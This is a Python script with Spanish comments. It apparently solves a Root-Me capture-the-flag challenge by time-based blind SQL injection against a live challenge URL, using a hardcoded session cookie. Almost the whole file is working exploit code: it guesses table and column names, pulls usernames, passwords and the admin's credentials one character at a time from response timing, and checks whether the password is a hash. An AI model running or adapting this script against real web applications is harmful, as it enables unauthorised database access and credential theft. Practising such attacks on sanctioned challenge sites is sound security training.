#!/usr/bin/env python3
"""
SQL INJECTION TIME-BASED - ROOT-ME CH40
VERSIÓN 14 - EXTRAER DIRECTAMENTE DE LA TABLA
"""
import requests
import time
import statistics

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

class TimeBasedSQLInjector:
    def __init__(self):
        self.session = requests.Session()
        self.session.cookies.update(COOKIE)
        self.baseline = 29.48
        self.threshold = 31.48
        self.heavy = "(SELECT COUNT(*) FROM users, users T1, users T2)"
        
    def test_payload(self, payload, repeats=5):
        tiempos = []
        params = {"action": "member", "member": payload}
        for _ in range(repeats):
            inicio = time.perf_counter_ns()
            try:
                r = self.session.get(URL, params=params, timeout=5)
                tiempo = (time.perf_counter_ns() - inicio) / 1_000_000
                tiempos.append(tiempo)
            except:
                tiempos.append(0)
            time.sleep(0.05)
        return statistics.median(tiempos) if tiempos else 0
    
    def is_true(self, condition, repeats=3):
        # Técnica OR (invertida)
        payload = f"1 OR ({condition}) OR {self.heavy}"
        t = self.test_payload(payload, repeats=repeats)
        return t < self.threshold  # Invertido: TRUE -> rápido
    
    def extract_string(self, query, label="Extrayendo", max_len=50):
        print(f"\n[*] {label}...")
        result = ""
        for pos in range(1, max_len + 1):
            low, high = 32, 126
            while low <= high:
                mid = (low + high) // 2
                cond = f"ASCII(SUBSTRING(({query}), {pos}, 1)) > {mid}"
                if self.is_true(cond, repeats=2):
                    low = mid + 1
                else:
                    high = mid - 1
            
            char = chr(low)
            result += char
            print(f"  [{pos}] '{char}' (ASCII: {ord(char)})")
            if ord(char) == 0 or ord(char) == 32:
                break
        return result

# EJECUCIÓN
injector = TimeBasedSQLInjector()

print("="*70)
print("  EXTRAYENDO DATOS DIRECTAMENTE DE LA TABLA")
print("="*70)

# 1. Encontrar tablas
print("\n[1] Buscando tablas...")
tablas = ['usuarios', 'users', 'member', 'members', 'admin', 'administradores']
tabla_encontrada = None

for tabla in tablas:
    if injector.is_true(f"EXISTS(SELECT * FROM {tabla})", repeats=2):
        print(f"  [+] Tabla encontrada: {tabla}")
        tabla_encontrada = tabla
        break
    else:
        print(f"  [-] Tabla no encontrada: {tabla}")

if not tabla_encontrada:
    print("\n[!] No se encontró ninguna tabla")
    exit()

# 2. Buscar columnas
print(f"\n[2] Buscando columnas en {tabla_encontrada}...")

columnas_usuario = ['username', 'user', 'login', 'name', 'admin', 'usuario']
col_user = None
for col in columnas_usuario:
    if injector.is_true(f"EXISTS(SELECT {col} FROM {tabla_encontrada})", repeats=2):
        print(f"  [+] Columna usuario: {col}")
        col_user = col
        break

columnas_pass = ['password', 'pass', 'clave', 'contrasena', 'pwd', 'pw']
col_pass = None
for col in columnas_pass:
    if injector.is_true(f"EXISTS(SELECT {col} FROM {tabla_encontrada})", repeats=2):
        print(f"  [+] Columna contraseña: {col}")
        col_pass = col
        break

if not col_user or not col_pass:
    print("\n[!] No se encontraron columnas")
    exit()

# 3. Extraer usuarios
print(f"\n[3] Extrayendo usuarios de {tabla_encontrada}...")
for i in range(1, 5):
    query = f"SELECT {col_user} FROM {tabla_encontrada} LIMIT 1 OFFSET {i-1}"
    usuario = injector.extract_string(query, f"Usuario {i}")
    print(f"  Usuario {i}: {usuario}")

# 4. Extraer contraseñas
print(f"\n[4] Extrayendo contraseñas de {tabla_encontrada}...")
for i in range(1, 5):
    query = f"SELECT {col_pass} FROM {tabla_encontrada} LIMIT 1 OFFSET {i-1}"
    password = injector.extract_string(query, f"Contraseña {i}")
    print(f"  Contraseña {i}: {password}")

# 5. Extraer el admin específicamente
print(f"\n[5] Extrayendo admin...")
query_admin_user = f"SELECT {col_user} FROM {tabla_encontrada} WHERE {col_user}='admin'"
admin_user = injector.extract_string(query_admin_user, "Usuario admin")
print(f"  Usuario admin: {admin_user}")

query_admin_pass = f"SELECT {col_pass} FROM {tabla_encontrada} WHERE {col_user}='admin'"
admin_pass = injector.extract_string(query_admin_pass, "Contraseña admin")
print(f"  Contraseña admin: {admin_pass}")

# 6. Contar total de registros
print(f"\n[6] Contando registros en {tabla_encontrada}...")
query_count = f"SELECT COUNT(*) FROM {tabla_encontrada}"
count = injector.extract_string(query_count, "Total registros")
print(f"  Total: {count}")

# 7. Extraer el ID del admin
print(f"\n[7] Extrayendo ID del admin...")
query_id = f"SELECT id FROM {tabla_encontrada} WHERE {col_user}='admin'"
admin_id = injector.extract_string(query_id, "ID del admin")
print(f"  ID admin: {admin_id}")

# 8. Verificar si la contraseña está hasheada (MD5, SHA1, etc.)
print(f"\n[8] Verificando si la contraseña es un hash...")
if admin_pass:
    print(f"  Contraseña extraída: {admin_pass}")
    print(f"  Longitud: {len(admin_pass)}")
    if len(admin_pass) == 32:
        print("  ✅ Posible MD5 (32 caracteres)")
    elif len(admin_pass) == 40:
        print("  ✅ Posible SHA1 (40 caracteres)")
    elif len(admin_pass) == 64:
        print("  ✅ Posible SHA256 (64 caracteres)")
    else:
        print(f"  ❓ Longitud no estándar: {len(admin_pass)}")
